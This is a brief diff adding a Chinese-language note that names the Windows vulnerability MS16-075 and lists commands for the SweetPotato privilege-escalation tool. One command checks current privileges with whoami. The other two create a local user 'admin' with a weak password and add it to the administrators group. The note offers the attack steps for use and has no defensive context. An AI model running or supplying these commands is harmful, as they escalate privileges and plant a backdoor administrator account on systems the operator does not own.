@@ -1,0 +1,9 @@
+漏洞代码
+MS16-075
+
+指令
+SweetPotato.exe -a "whoami"   //查询当前权限
+
+SweetPotato.exe -a "net user admin 123456 /add"
+
+SweetPotato.exe -a "net localgroup administrators admin /add"
